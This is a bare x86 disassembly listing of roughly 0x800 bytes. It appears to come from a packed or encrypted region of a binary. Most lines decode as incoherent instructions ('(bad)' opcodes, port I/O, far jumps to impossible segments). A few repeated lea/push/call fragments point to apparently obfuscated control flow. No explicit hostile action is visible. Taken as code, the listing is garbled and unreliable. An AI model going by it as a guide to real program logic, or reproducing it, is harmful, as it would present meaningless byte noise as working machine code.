  423446:	add    BYTE PTR [edi-0x16b7b6ca],dl
  42344c:	jg     0x4233e5
  42344e:	push   DWORD PTR [esp+ebx*2-0x64]
  423452:	imul   esi,DWORD PTR [ebx-0x703242ad],0xb100019e
  42345c:	add    BYTE PTR [eax],al
  42345e:	add    BYTE PTR [ebp+edx*2+0x287817a5],dl
  423465:	stos   BYTE PTR es:[edi],al
  423466:	in     al,dx
  423467:	stc    
  423468:	dec    ebp
  423469:	in     al,0x66
  42346b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42346c:	ss aaa 
  42346e:	jae    0x423452
  423470:	add    BYTE PTR [edx+0x4f2bf724],bl
  423476:	jl     0x4234db
  423478:	repz pusha 
  42347a:	cmp    ax,0x227e
  42347e:	jl     0x423494
  423480:	adc    bl,BYTE PTR [ebx+0x7f62b55d]
  423486:	leave  
  423487:	add    edx,0x59ef11d8
  42348d:	inc    ebx
  42348e:	push   0x1b
  423490:	mov    ebp,0x4e62cce9
  423495:	cmp    DWORD PTR [ecx],edi
  423497:	cld    
  423498:	push   edi
  423499:	in     eax,0x74
  42349b:	les    esp,FWORD PTR [edx+0x22]
  42349e:	add    DWORD PTR [ebp-0x3caacaef],ebx
  4234a4:	test   BYTE PTR [esi+0x33c0eb33],cl
  4234aa:	fistp  WORD PTR ss:[esi]
  4234ad:	sbb    dl,ch
  4234af:	or     DWORD PTR [esi-0x74a26c99],ebx
  4234b5:	push   ebp
  4234b6:	cmp    cl,BYTE PTR [ecx]
  4234b8:	push   esi
  4234b9:	xor    bh,al
  4234bb:	xor    cl,BYTE PTR [edi-0x60db6356]
  4234c1:	fld    DWORD PTR [edi+ebp*1-0xd58ca34]
  4234c8:	dec    ecx
  4234c9:	cmp    DWORD PTR [esi],esi
  4234cb:	add    ebp,DWORD PTR [edx+0x5d]
  4234ce:	push   esi
  4234cf:	ss cmp eax,0x1ea65d84
  4234d5:	xchg   edi,eax
  4234d6:	clc    
  4234d7:	cmc    
  4234d8:	and    eax,0x9e71cc04
  4234dd:	aad    0x6b
  4234df:	fcmovu st,st(6)
  4234e1:	jmp    DWORD PTR [ebx+0x5b771318]
  4234e7:	adc    DWORD PTR [ebp-0x55],esp
  4234ea:	xchg   ebx,eax
  4234eb:	sbb    bl,BYTE PTR [eax+0x4060965b]
  4234f1:	mov    ah,0x1a
  4234f3:	aam    0x49
  4234f5:	dec    ecx
  4234f6:	xor    al,BYTE PTR [ebx+0x5e]
  4234f9:	fidivr DWORD PTR [edi+0x720adc62]
  4234ff:	popa   
  423500:	imul   esp
  423502:	aad    0xcd
  423504:	leave  
  423505:	imul   edi,DWORD PTR [esi-0x27],0x37
  423509:	xchg   edx,eax
  42350a:	push   ecx
  42350b:	loopne 0x42353d
  42350d:	std    
  42350e:	xlat   BYTE PTR ds:[ebx]
  42350f:	mov    cs,WORD PTR [ecx+0x458bdc55]
  423515:	int3   
  423516:	jmp    0x4235e4
  42351b:	xchg   ecx,eax
  42351c:	rcr    BYTE PTR [eax+ecx*4+0x5d],0x9c
  423521:	aad    0xd9
  423523:	arpl   sp,sp
  423525:	sbb    al,0x69
  423527:	xchg   ebx,eax
  423528:	pop    esi
  423529:	jo     0x42352d
  42352b:	inc    eax
  42352c:	lahf   
  42352d:	add    DWORD PTR [eax],eax
  42352f:	mov    cl,0x0
  423531:	add    BYTE PTR [eax],al
  423533:	sub    edi,DWORD PTR [ebx+eiz*8+0x48]
  423537:	stos   DWORD PTR es:[edi],eax
  423538:	retf   0xd998
  42353b:	out    0x76,al
  42353d:	xchg   edx,eax
  42353e:	imul   ecx,DWORD PTR [edx-0x53],0xfffffff2
  423542:	jbe    0x4234ee
  423544:	aas    
  423545:	inc    ecx
  423546:	test   bh,ah
  423548:	icebp  
  423549:	xchg   DWORD PTR [esi+0x6f],eax
  42354c:	(bad)  
  42354d:	dec    edi
  42354e:	test   DWORD PTR ds:0xc9cdd061,ebx
  423554:	mov    edi,0x93fe70fd
  423559:	std    
  42355a:	adc    BYTE PTR [ebx-0x2b81b70e],dh
  423560:	push   0xffffffc3
  423562:	add    DWORD PTR [esi-0x1e],eax
  423565:	leave  
  423566:	jo     0x4235c3
  423568:	or     eax,eax
  42356a:	cli    
  42356b:	mov    edi,0x93208f65
  423570:	shr    DWORD PTR [edx+eiz*1-0x73],1
  423574:	sbb    ebp,DWORD PTR [ebp-0x4a]
  423577:	push   ss
  423578:	jg     0x4235c3
  42357a:	ins    BYTE PTR es:[edi],dx
  42357b:	fisubr DWORD PTR [ecx]
  42357d:	repnz sahf 
  42357f:	mov    ch,0x1d
  423581:	push   edx
  423582:	and    al,BYTE PTR [ebx+ecx*8-0x43]
  423586:	test   eax,0x85e62628
  42358b:	cli    
  42358c:	in     eax,0x68
  42358e:	je     0x4235fb
  423590:	jnp    0x42353d
  423592:	inc    ecx
  423593:	jle    0x423523
  423595:	jg     0x4235a5
  423597:	xcrypt-ctr (bad)
  423598:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423599:	pop    ebp
  42359a:	neg    ah
  42359c:	rol    DWORD PTR [edx+esi*4-0x25],1
  4235a0:	arpl   WORD PTR [eax-0x22a16f99],cx
  4235a6:	jmp    0x4235b0
  4235a8:	hlt    
  4235a9:	adc    ecx,DWORD PTR [edi]
  4235ab:	xlat   BYTE PTR ds:[ebx]
  4235ac:	dec    esp
  4235ad:	(bad)  
  4235ae:	mov    dl,0x5a
  4235b0:	std    
  4235b1:	sub    BYTE PTR [esp+eiz*8],bl
  4235b4:	or     eax,0x4ff478e
  4235b9:	ffree  st(4)
  4235bb:	push   DWORD PTR [esi]
  4235bd:	pop    ecx
  4235be:	jmp    0xbcf5:0x1c01bd5c
  4235c5:	push   esi
  4235c6:	xor    al,BYTE PTR [edx+0x6979fe9]
  4235cc:	adc    eax,0x5c8efcd8
  4235d1:	adc    ah,al
  4235d3:	sti    
  4235d4:	push   ss
  4235d5:	test   BYTE PTR [ebx+0x4db420de],bh
  4235db:	popf   
  4235dc:	nop
  4235dd:	mov    bh,0x18
  4235df:	out    dx,al
  4235e0:	xchg   edi,eax
  4235e1:	out    0x8,eax
  4235e3:	jnp    0x42356f
  4235e5:	push   ebp
  4235e6:	(bad)  
  4235e7:	jmp    0x4236b5
  4235ec:	mov    DWORD PTR [edx-0x59],0xfffda7d8
  4235f3:	pop    edi
  4235f4:	imul   edx,DWORD PTR [eax-0x2f8185fc],0x9ff1650a
  4235fe:	add    DWORD PTR [eax],eax
  423600:	mov    cl,0x0
  423602:	add    BYTE PTR [eax],al
  423604:	sbb    dl,BYTE PTR [edi-0xae8cc79]
  42360a:	push   ebp
  42360b:	in     eax,dx
  42360c:	pop    edx
  42360d:	mov    esi,0x10c70fb6
  423612:	pop    esi
  423613:	pusha  
  423614:	pop    ds
  423615:	ds sub edx,ecx
  423618:	sub    al,0x23
  42361a:	jl     0x423639
  42361c:	inc    edx
  42361d:	cli    
  42361e:	int3   
  42361f:	hlt    
  423620:	push   ecx
  423621:	std    
  423622:	nop
  423623:	nop
  423624:	stos   BYTE PTR es:[edi],al
  423625:	xor    eax,0xc262e731
  42362a:	mov    DWORD PTR [ebx],ebx
  42362c:	and    cl,BYTE PTR [edx+ebx*4-0x717df645]
  423633:	mov    bh,0xa
  423635:	push   es
  423636:	sub    BYTE PTR [edi-0x7104ea21],0xde
  42363d:	add    eax,0x55096d8f
  423642:	les    esp,FWORD PTR [ecx]
  423644:	mov    ds:0xba58e5,al
  423649:	(bad)  
  42364a:	(bad)  
  42364b:	cmp    DWORD PTR [ebp+0x3d30c90e],ebx
  423651:	fld    QWORD PTR [ecx]
  423653:	pop    edi
  423654:	and    ebx,DWORD PTR [ebx+esi*4+0x7f]
  423658:	aaa    
  423659:	mov    ebp,0x69d631ad
  42365e:	popa   
  42365f:	es repnz cld 
  423662:	mov    ebp,0xef4512c4
  423667:	jne    0x423654
  423669:	jae    0x423622
  42366b:	mov    ebp,0x79862a20
  423670:	popf   
  423671:	sti    
  423672:	inc    ecx
  423673:	fstp   QWORD PTR [eax+0x337745e0]
  423679:	shl    DWORD PTR [esi-0x4],1
  42367c:	rcr    DWORD PTR [ecx+0x5b],1
  42367f:	pop    es
  423680:	sub    al,BYTE PTR [ecx+edi*4-0x3ce19b63]
  423687:	xchg   BYTE PTR [esi],ah
  423689:	sub    BYTE PTR [ecx],0x3e
  42368c:	inc    esi
  42368d:	icebp  
  42368e:	xor    al,0x93
  423690:	pop    ecx
  423691:	mov    ebp,0xacb02337
  423696:	int3   
  423697:	hlt    
  423698:	mov    cs,WORD PTR [ecx-0x3e7aff6e]
  42369e:	(bad)  
  42369f:	jb     0x423662
  4236a1:	sbb    esp,DWORD PTR [eax+ecx*8-0x80]
  4236a5:	lock sub DWORD PTR [ebx+0x77123019],ebp
  4236ac:	add    eax,0x9369c17e
  4236b1:	add    ebp,edx
  4236b3:	adc    BYTE PTR [edx-0x78],cl
  4236b6:	adc    BYTE PTR [ebx-0x36160fbb],cl
  4236bc:	add    BYTE PTR [eax],al
  4236be:	add    BYTE PTR [edi+ebx*8-0x59045b27],bh
  4236c5:	std    
  4236c6:	fbstp  TBYTE PTR [edx+0x69]
  4236c9:	and    ah,BYTE PTR [ecx+0x692a85a9]
  4236cf:	mov    ds:0xb10001a0,al
  4236d4:	add    BYTE PTR [eax],al
  4236d6:	add    BYTE PTR [ebx-0xe],bh
  4236d9:	scas   al,BYTE PTR es:[edi]
  4236da:	adc    DWORD PTR [edx],edx
  4236dc:	fincstp 
  4236de:	nop
  4236df:	pop    ebp
  4236e0:	dec    ecx
  4236e1:	cmp    edx,esp
  4236e3:	inc    ebp
  4236e4:	or     al,BYTE PTR [esi]
  4236e6:	cmp    DWORD PTR [edi+eiz*8+0x78],0xffffffb6
  4236eb:	mov    al,ds:0x98c5f1b4
  4236f0:	loop   0x423672
  4236f2:	rcl    edx,0x4e
  4236f5:	out    0xca,eax
  4236f7:	test   DWORD PTR [ebx],edi
  4236f9:	push   ebp
  4236fa:	xor    edx,eax
  4236fc:	or     dl,0xc3
  4236ff:	bound  ebx,QWORD PTR [ebp-0x74]
  423702:	stos   DWORD PTR es:[edi],eax
  423703:	outs   dx,DWORD PTR ds:[esi]
  423704:	nop
  423705:	sahf   
  423706:	inc    ebx
  423707:	lock mov ah,0x63
  42370a:	jecxz  0x42376d
  42370c:	fidiv  DWORD PTR [edx]
  42370e:	or     DWORD PTR [ebp-0x34],esi
  423711:	push   es
  423712:	add    ebx,DWORD PTR [ecx+0x221a502d]
  423718:	(bad)  
  423719:	in     eax,dx
  42371a:	xchg   DWORD PTR [eax+eax*8-0xe],edi
  42371e:	(bad)  
  42371f:	fdiv   st,st(1)
  423721:	daa    
  423722:	ret    0xe718
  423725:	xchg   esp,eax
  423726:	xchg   edx,eax
  423727:	mov    bl,0x6
  423729:	scas   eax,DWORD PTR es:[edi]
  42372a:	(bad)  
  42372b:	mov    BYTE PTR [ebx+0x6bf0458e],cl
  423731:	popf   
  423732:	test   al,cl
  423734:	inc    eax
  423735:	pop    eax
  423736:	out    dx,eax
  423737:	shr    BYTE PTR ds:0x9036597c,0x73
  42373e:	inc    esi
  42373f:	and    cl,BYTE PTR [edx+0x4c]
  423742:	and    BYTE PTR [edx+ecx*4+0x1437f0be],dl
  423749:	cld    
  42374a:	fist   DWORD PTR [edx]
  42374c:	popf   
  42374d:	or     eax,DWORD PTR [ebx-0x3220a84c]
  423753:	push   eax
  423754:	jge    0x42373f
  423756:	mul    BYTE PTR [ebp-0x7452f73b]
  42375c:	outs   dx,BYTE PTR ds:[esi]
  42375d:	arpl   bp,dx
  42375f:	push   esi
  423760:	(bad)  
  423761:	mov    ecx,0x13471ee2
  423766:	xchg   edx,eax
  423767:	call   0x3f0dd6a7
  42376c:	push   ecx
  42376d:	test   DWORD PTR [edx+0x6a],edx
  423770:	test   al,0xad
  423772:	sbb    DWORD PTR [edi],0xffffffff
  423775:	sub    al,0x93
  423777:	push   eax
  423778:	loopne 0x4237a1
  42377a:	in     eax,0x47
  42377c:	mov    ebx,0xdb466c76
  423781:	xor    ch,dl
  423783:	sub    BYTE PTR [ebx+ecx*4-0x6b],bh
  423787:	stos   BYTE PTR es:[edi],al
  423788:	inc    eax
  423789:	jmp    0x423857
  42378e:	xor    DWORD PTR [ecx+0x20],edi
  423791:	jnp    0x4237fb
  423793:	jnp    0x423810
  423795:	jnp    0x423762
  423797:	(bad)  
  423798:	hlt    
  423799:	xchg   ebp,eax
  42379a:	dec    ebx
  42379b:	jmp    0x42373a
  42379d:	xchg   edx,eax
  42379e:	push   ebx
  42379f:	mov    eax,ds:0xb10001
  4237a4:	add    BYTE PTR [eax],al
  4237a6:	adc    ebx,DWORD PTR [eax+ebp*2+0x711f720d]
  4237ad:	adc    al,0x6e
  4237af:	xor    al,0x22
  4237b1:	sub    DWORD PTR [ecx-0x659ac499],edx
  4237b7:	out    0x51,eax
  4237b9:	repnz xor bl,BYTE PTR ss:[edx-0x6e]
  4237be:	dec    eax
  4237bf:	mov    gs,WORD PTR [eax-0x5]
  4237c2:	mov    bh,bl
  4237c4:	add    edx,DWORD PTR ds:0xa07476f
  4237ca:	inc    ebx
  4237cb:	and    DWORD PTR [edx+0x52],esi
  4237ce:	nop
  4237cf:	xchg   edi,eax
  4237d0:	test   BYTE PTR [eax],bh
  4237d2:	mov    ds:0x8eea4b73,al
  4237d7:	and    edx,DWORD PTR [ecx+esi*4]
  4237da:	sbb    dl,BYTE PTR [ebx+eax*2+0x5e86fbae]
  4237e1:	sub    BYTE PTR [edi+0x6b],0xcc
  4237e5:	out    0x63,eax
  4237e7:	jg     0x42381e
  4237e9:	mov    ch,0xac
  4237eb:	adc    eax,0x60b4a8d4
  4237f0:	lods   al,BYTE PTR ds:[esi]
  4237f1:	dec    esp
  4237f2:	or     bh,BYTE PTR [ebx+0x450f9de5]
  4237f8:	cmp    al,0xc6
  4237fa:	cs pop ebp
  4237fc:	xor    eax,0x90012c21
  423801:	sbb    esp,ecx
  423803:	and    eax,0x5e2449d1
  423808:	mov    al,0xff
  42380a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42380b:	mov    eax,ds:0x5f2a6e56
  423810:	fcmovu st,st(5)
  423812:	jecxz  0x4237be
  423814:	rcl    BYTE PTR [eax+0x54],0x49
  423818:	xchg   BYTE PTR [edx-0x49694b84],dl
  42381e:	and    ebp,DWORD PTR [ebp-0x27]
  423821:	sbb    BYTE PTR [edi+0x6ae0319e],dh
  423827:	inc    edi
  423828:	jo     0x4237df
  42382a:	scas   al,BYTE PTR es:[edi]
  42382b:	xor    eax,0x5fd78ed6
  423830:	mov    ds:0x91b4cfb6,eax
  423835:	imul   edi,DWORD PTR [ecx+0x256b8d43],0xffffffab
  42383c:	lods   al,BYTE PTR ds:[esi]
  42383d:	jnp    0x423829
  42383f:	and    al,0x3
  423841:	inc    ecx
  423842:	sub    ah,BYTE PTR [ebx+ebp*1]
  423845:	mov    eax,0x329b6072
  42384a:	call   0xf295:0xa8750e6b
  423851:	dec    ebx
  423852:	xchg   DWORD PTR [eax+0x65],esi
  423855:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423856:	jmp    0xd045:0x3bf04589
  42385d:	jmp    0x42392b
  423862:	mov    BYTE PTR [eax+ebp*2-0x230383c4],dl
  423869:	mov    ah,0xb9
  42386b:	add    esp,ebx
  42386d:	ficom  DWORD PTR [ebx+0x433a9c3]
  423873:	mov    ds:0xb10001,al
  423878:	add    BYTE PTR [eax],al
  42387a:	retf   
  42387b:	adc    eax,0x3468f3ff
  423880:	dec    ecx
  423881:	vmwrite esp,edi
  423884:	mov    esi,0x87696034
  423889:	fmul   QWORD PTR [ebp-0x21ed2898]
  42388f:	test   al,0xf8
  423892:	scas   al,BYTE PTR es:[edi]
  423893:	or     DWORD PTR [eax],ecx
  423895:	mov    BYTE PTR [eax-0x76ce3140],ch
  42389b:	pusha  
  42389c:	xor    dh,0x8a
  42389f:	fldenv [ecx-0x1c080881]
  4238a5:	fld    DWORD PTR [ebp-0xc52eaed]
  4238ab:	sahf   
  4238ac:	mov    ds:0xdcabdda5,al
  4238b1:	adc    bl,ch
  4238b3:	mov    al,BYTE PTR [eax]
  4238b5:	sub    BYTE PTR ds:0x83073936,dh
  4238bb:	in     eax,0x73
  4238bd:	inc    ecx
  4238be:	xlat   BYTE PTR ds:[ebx]
  4238bf:	jmp    0x42391d
  4238c1:	pop    eax
  4238c2:	retf   0xd954
  4238c5:	mov    bh,0x8a
  4238c7:	add    eax,0xca0f2b33
  4238cc:	xchg   esi,eax
  4238cd:	ins    BYTE PTR es:[edi],dx
  4238ce:	dec    esp
  4238cf:	mov    ecx,0x56165fc1
  4238d4:	jb     0x423909
  4238d6:	push   ebp
  4238d7:	sub    ecx,DWORD PTR [edi+eax*1]
  4238da:	(bad)  
  4238db:	not    DWORD PTR [ebx+0x2e]
  4238de:	scas   eax,DWORD PTR es:[edi]
  4238df:	push   ecx
  4238e0:	leave  
  4238e1:	push   esi
  4238e2:	je     0x42395c
  4238e4:	cmp    al,0xa
  4238e6:	adc    DWORD PTR [ebx+edx*4-0x35003e87],eax
  4238ed:	lea    ebp,[esi-0x4b]
  4238f0:	cdq    
  4238f1:	xlat   BYTE PTR ds:[ebx]
  4238f2:	in     eax,0xf0
  4238f4:	xchg   edx,eax
  4238f5:	jo     0x423943
  4238f7:	mov    ecx,0x2733886a
  4238fc:	push   ebp
  4238fd:	ds jp  0x423942
  423900:	push   es
  423901:	jp     0x423938
  423903:	push   edx
  423904:	push   ecx
  423905:	aas    
  423906:	iret   
  423907:	jecxz  0x4238a6
  423909:	lods   eax,DWORD PTR ds:[esi]
  42390a:	test   dl,al
  42390c:	inc    eax
  42390d:	or     al,0x62
  42390f:	fdiv   DWORD PTR [ebp+0x25d72944]
  423915:	sbb    ecx,DWORD PTR [eax]
  423917:	ja     0x4238ea
  423919:	mov    ah,0x65
  42391b:	sbb    al,0xcc
  42391d:	(bad)  
  42391e:	xchg   esp,eax
  42391f:	and    dh,BYTE PTR [edi-0x76]
  423922:	dec    edx
  423923:	retf   
  423924:	cld    
  423925:	loope  0x42397f
  423927:	sub    al,0xc7
  423929:	jae    0x423904
  42392b:	jb     0x421cc7
  423931:	jmp    0x4239ff
  423936:	cli    
  423937:	das    
  423938:	pushf  
  423939:	fcomp  st(5)
  42393b:	sti    
  42393c:	(bad)  
  42393d:	das    
  42393e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42393f:	or     eax,DWORD PTR [ecx-0x5b]
  423942:	ss pop edi
  423944:	pop    ecx
  423945:	fidiv  WORD PTR [ebp-0x4efffe5e]
  42394b:	add    BYTE PTR [eax],al
  42394d:	add    BYTE PTR [edx-0x3],bl
  423950:	and    edx,DWORD PTR [eax]
  423952:	(bad)  
  423953:	and    edi,DWORD PTR [eax+0x1079a9c1]
  423959:	or     dh,BYTE PTR [edi-0x6e]
  42395c:	loope  0x423984
  42395e:	xchg   esp,eax
  42395f:	mov    ah,0x72
  423961:	jg     0x423988
  423963:	pop    eax
  423964:	int3   
  423965:	imul   ecx,DWORD PTR [edi],0xf2354a87
  42396b:	cmp    bl,BYTE PTR [ecx-0x49165609]
  423971:	jae    0x4239b0
  423973:	jb     0x4239ac
  423975:	mov    eax,0x98dd0e13
  42397a:	test   DWORD PTR [esi],esi
  42397c:	sbb    cl,0xef
  42397f:	mov    edx,0xe842d564
  423984:	add    al,0x52
  423986:	mov    dl,dl
  423988:	icebp  
  423989:	mov    DWORD PTR [edi-0x37],eax
  42398c:	sub    BYTE PTR [edx+0x6f62273e],0x74
  423993:	mov    ah,0xf6
  423995:	stos   BYTE PTR es:[edi],al
  423996:	xor    BYTE PTR [esi+0x4e],bh
  423999:	add    bh,BYTE PTR [ebp-0x29cb9d73]
  42399f:	jmp    0x4dc1b47a
  4239a4:	out    dx,eax
  4239a5:	pop    DWORD PTR [eax-0x5d0430d4]
  4239ab:	and    al,0x50
  4239ad:	daa    
  4239ae:	or     DWORD PTR [ebp+eax*2-0x26],ebp
  4239b2:	mov    esi,0x3b997b60
  4239b7:	push   ebx
  4239b8:	aad    0x9c
  4239ba:	out    0x3e,eax
  4239bc:	into   
  4239bd:	in     eax,0x7
  4239bf:	jle    0x4239e0
  4239c1:	cmp    ecx,DWORD PTR ds:0x130099b8
  4239c7:	retf   0xee4
  4239ca:	std    
  4239cb:	cmp    cl,cl
  4239cd:	push   ecx
  4239ce:	pop    eax
  4239cf:	outs   dx,DWORD PTR ds:[esi]
  4239d0:	mov    esi,0xe7d4a11d
  4239d5:	mov    ecx,0x78b6e456
  4239da:	cwde   
  4239db:	xchg   ebp,eax
  4239dc:	cmp    eax,0x2b7fff6f
  4239e1:	push   ss
  4239e2:	dec    ebx
  4239e3:	lea    ebp,[ebx+0x162ea789]
  4239e9:	xchg   esp,eax
  4239ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4239eb:	xchg   ebx,eax
  4239ec:	sub    al,0x3f
  4239ee:	xchg   edx,eax
  4239ef:	neg    BYTE PTR [ebx]
  4239f1:	pop    ebp
  4239f2:	dec    eax
  4239f3:	sbb    DWORD PTR [eax],ecx
  4239f5:	sub    ah,BYTE PTR [eax]
  4239f7:	mov    eax,0xa9c54cf4
  4239fc:	mov    al,ds:0x458b1b41
  423a01:	or     BYTE PTR [ebx+0x4d8be47d],cl
  423a07:	or     al,0x33
  423a09:	(bad)  
  423a0a:	push   0x1
  423a0c:	lea    eax,[eax+edi*1-0x66479db3]
  423a13:	push   eax
  423a14:	lea    eax,[ebp-0x29]
  423a17:	push   eax
  423a18:	call   0x41d107
  423a1d:	jmp    0x423aeb
  423a22:	xor    edi,ebx
  423a24:	aaa    
  423a25:	or     bh,bh
  423a27:	jmp    0xde39:0xb9ceff3d
  423a2e:	inc    esi
  423a2f:	bound  ebx,QWORD PTR [edx+0x1a366de]
  423a35:	add    BYTE PTR [ecx+0x2000000],dh
  423a3b:	dec    esi
  423a3c:	jle    0x4239e3
  423a3e:	cmc    
  423a3f:	fs pop ss
  423a41:	aam    0x40
  423a43:	aam    0x5b
  423a45:	mov    cl,0x28
  423a47:	pop    es
  423a48:	add    al,0x6d
  423a4a:	mov    ss:0x4ac0b6b8,al
  423a50:	cmp    ebp,esi
  423a52:	dec    esi
  423a53:	test   al,0xd9
  423a55:	mov    ebp,0xd8bab5e
  423a5a:	adc    al,0x20
  423a5c:	scas   al,BYTE PTR es:[edi]
  423a5d:	adc    ebp,DWORD PTR [esi+ebp*2+0x18]
  423a61:	enter  0x5243,0xa9
  423a65:	push   cs
  423a66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a67:	fs loopne 0x423a42
  423a6a:	leave  
  423a6b:	out    dx,al
  423a6c:	call   DWORD PTR [edx-0x6e]
  423a6f:	pop    ebx
  423a70:	loop   0x423aed
  423a72:	cdq    
  423a73:	dec    DWORD PTR [ebx-0x33]
  423a76:	lods   eax,DWORD PTR ds:[esi]
  423a77:	stos   DWORD PTR es:[edi],eax
  423a78:	shl    ebp,0x25
  423a7b:	dec    eax
  423a7c:	xor    eax,0x9d623ef0
  423a81:	xor    al,0xf7
  423a83:	imul   edi,ecx,0xffffffec
  423a86:	ret    0x8a55
  423a89:	jmp    DWORD PTR [esi+0x3e538c65]
  423a8f:	sbb    al,0x40
  423a91:	(bad)  
  423a92:	ror    DWORD PTR [ebx-0x6844c164],cl
  423a98:	js     0x423a6b
  423a9a:	lahf   
  423a9b:	test   eax,0xd2cf31a8
  423aa0:	push   ss
  423aa1:	jge    0x423aa8
  423aa3:	sbb    DWORD PTR [edx-0x751203a4],ebx
  423aa9:	scas   al,BYTE PTR es:[edi]
  423aaa:	pop    eax
  423aab:	mov    bl,0x7f
  423aad:	jmp    0x423a71
  423aaf:	add    BYTE PTR [ebx+ebp*8-0x5c],ch
  423ab3:	push   DWORD PTR ss:[ecx+0x3e]
  423ab7:	push   ds
  423ab8:	adc    ebx,0xffffffb7
  423abb:	jb     0x423acf
  423abd:	mov    edx,edx
  423abf:	xchg   ebx,eax
  423ac0:	aam    0xee
  423ac2:	add    bh,BYTE PTR [edi+0x54654496]
  423ac8:	inc    edi
  423ac9:	or     eax,0x981c5d37
  423ace:	inc    esi
  423acf:	ins    BYTE PTR es:[edi],dx
  423ad0:	fisttp WORD PTR [edi]
  423ad2:	add    dh,BYTE PTR [edi]
  423ad4:	adc    eax,0x3004f9b3
  423ad9:	hlt    
  423ada:	xlat   BYTE PTR ds:[ebx]
  423adb:	les    esi,FWORD PTR [ebp+edx*2-0x46e9134c]
  423ae2:	adc    al,0xd5
  423ae4:	add    al,0xa
  423ae6:	neg    BYTE PTR [ecx-0x745bbd19]
  423aec:	inc    ebp
  423aed:	adc    BYTE PTR [ebx-0x39ccebb3],cl
  423af3:	lea    eax,[eax+edi*1-0x66479db3]
  423afa:	push   0x1
  423afc:	push   eax
  423afd:	mov    eax,DWORD PTR [ebp+0x8]
  423b00:	mov    ecx,DWORD PTR [ebp+0xc]
  423b03:	xor    eax,esi
  423b05:	lea    eax,[eax+edi*1-0x66479db3]
  423b0c:	push   eax
  423b0d:	call   0x41d107
  423b12:	push   0x1
  423b14:	lea    eax,[ebp-0x29]
  423b17:	push   eax
  423b18:	jmp    0x423be6
  423b1d:	pop    eax
  423b1e:	adc    BYTE PTR [ebx+0x5ca7fba7],dh
  423b24:	dec    DWORD PTR [ebx]
  423b26:	sub    ebp,edi
  423b28:	pop    edi
  423b29:	dec    edx
  423b2a:	sub    eax,0xa4171c47
  423b2f:	add    DWORD PTR [eax],eax
  423b31:	mov    cl,0x0
  423b33:	add    BYTE PTR [eax],al
  423b35:	cmp    BYTE PTR [eax-0x493e53be],0xef
  423b3c:	mov    edx,ebp
  423b3e:	pop    esp
  423b3f:	pop    esi
  423b40:	jl     0x423aec
  423b42:	mov    al,0x11
  423b44:	dec    edi
  423b45:	adc    al,0xd3
  423b47:	fist   DWORD PTR [ecx+0x56209482]
  423b4d:	and    eax,0xa3ca387d
  423b52:	dec    edi
  423b53:	ja     0x423b45
  423b55:	hlt    
  423b56:	retf   0x252a
  423b59:	sar    DWORD PTR [eax+ecx*8-0x4cf4a07d],0xcf
  423b61:	push   eax
  423b62:	jg     0x423bcd
  423b64:	out    0xfd,eax
  423b66:	cmp    eax,0x5a6daa82
  423b6b:	cmp    eax,0xb6abc80d
  423b70:	jmp    0x423afd
  423b72:	sbb    eax,0x1e1bd873
  423b77:	sbb    ebx,DWORD PTR [edx+0x38bd7290]
  423b7d:	adc    eax,0x9fbce990
  423b82:	cmp    ecx,DWORD PTR [edi+0x47a34e32]
  423b88:	cmc    
  423b89:	inc    ebx
  423b8a:	xchg   ecx,eax
  423b8b:	sahf   
  423b8c:	call   0x6d52:0x936bbb0a
  423b93:	(bad)  
  423b94:	rcr    edi,cl
  423b96:	xchg   BYTE PTR [ecx],dl
  423b98:	xor    DWORD PTR [edx+eax*1],ebp
  423b9b:	shl    BYTE PTR [ebx],0xc7
  423b9e:	shl    DWORD PTR [esi],1
  423ba0:	sbb    eax,0xefd0ce0b
  423ba5:	inc    esi
  423ba6:	mov    al,ds:0xcaadd485
  423bab:	lods   al,BYTE PTR ds:[esi]
  423bac:	mov    ecx,0x7f146607
  423bb1:	dec    esp
  423bb2:	and    esi,DWORD PTR [ebp-0x69]
  423bb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423bb6:	pop    ss
  423bb7:	xor    eax,0x4145466c
  423bbc:	jb     0x423b88
  423bbe:	and    eax,0x86f43325
  423bc3:	cmp    cl,BYTE PTR [edi]
  423bc5:	adc    ebx,ebp
  423bc7:	jns    0x423b5c
  423bc9:	or     eax,0xea733809
  423bce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423bcf:	xor    BYTE PTR [ebx+0x7a],ch
  423bd2:	push   es
  423bd3:	std    
  423bd4:	or     al,0xcf
  423bd6:	aam    0x22
  423bd8:	push   esp
  423bd9:	outs   dx,DWORD PTR ds:[esi]
  423bda:	cs adc al,bl
  423bdd:	std    
  423bde:	mov    ebx,0xdbeda674
  423be3:	or     al,0x1f
  423be5:	add    ecx,DWORD PTR [ebx+0x4d8b1045]
  423beb:	adc    al,0x33
  423bed:	(bad)  
  423bee:	lea    eax,[eax+edi*1-0x66479db3]
  423bf5:	push   eax
  423bf6:	call   0x41d107
  423bfb:	mov    edi,0x66479db3
  423c00:	jmp    0x423cce
  423c05:	mov    ds:0xfe2fbacd,eax
  423c0a:	jg     0x423bc3
  423c0c:	int    0xf5
  423c0e:	icebp  
  423c0f:	and    BYTE PTR [esi-0x9],cl
  423c12:	add    DWORD PTR [esp+ebx*1-0x38],0xb10001a4
  423c1a:	add    BYTE PTR [eax],al
  423c1c:	add    BYTE PTR [ecx],bl
  423c1e:	cdq    
  423c1f:	call   0xdf56:0xe595cff8
  423c26:	inc    esi
  423c27:	ins    BYTE PTR es:[edi],dx
  423c28:	and    DWORD PTR [ecx+ecx*1-0x4e],0x73b8c994
  423c30:	lods   eax,DWORD PTR ds:[esi]
  423c31:	ds inc eax
  423c33:	dec    esi
  423c34:	jno    0x423c03
  423c36:	std    
  423c37:	inc    esi
  423c38:	aad    0x1c
  423c3a:	pop    esp
  423c3b:	adc    al,0x6d
  423c3d:	or     eax,0x56c8f491
  423c42:	mov    al,BYTE PTR [eax]
  423c44:	dec    ebx
  423c45:	mov    ebx,DWORD PTR [edx-0x59]
  423c48:	xor    ah,BYTE PTR [ebp+0x3a3b70f4]
  423c4e:	mov    edi,0x5646ae5a
  423c53:	icebp  
  423c54:	push   ds
  423c55:	(bad)  
  423c56:	xchg   esp,eax
  423c57:	lock push ecx
